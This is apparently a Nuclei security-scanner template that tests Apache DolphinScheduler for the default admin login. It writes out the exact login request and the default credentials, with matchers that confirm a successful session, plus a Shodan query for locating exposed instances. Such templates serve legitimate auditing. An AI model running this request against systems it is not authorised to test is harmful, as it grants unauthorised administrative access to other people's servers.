id: dolphinScheduler-default-login

info:
  name: Apache DolphinScheduler Default Login
  author: For3stCo1d
  severity: high
  metadata:
    shodan-query: http.title:"DolphinScheduler"
  tags: apache,dolphinScheduler,default-login

requests:
  - raw:
      - |
        POST /dolphinscheduler/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        userName={{user}}&userPassword={{pass}}
    attack: pitchfork
    payloads:
      user:
        - admin
      pass:
        - dolphinscheduler123

    matchers-condition: and
    matchers:
      - type: word
        part: body
        condition: and
        words:
          - 'login success'
          - 'sessionId'

      - type: status
        status:
          - 200
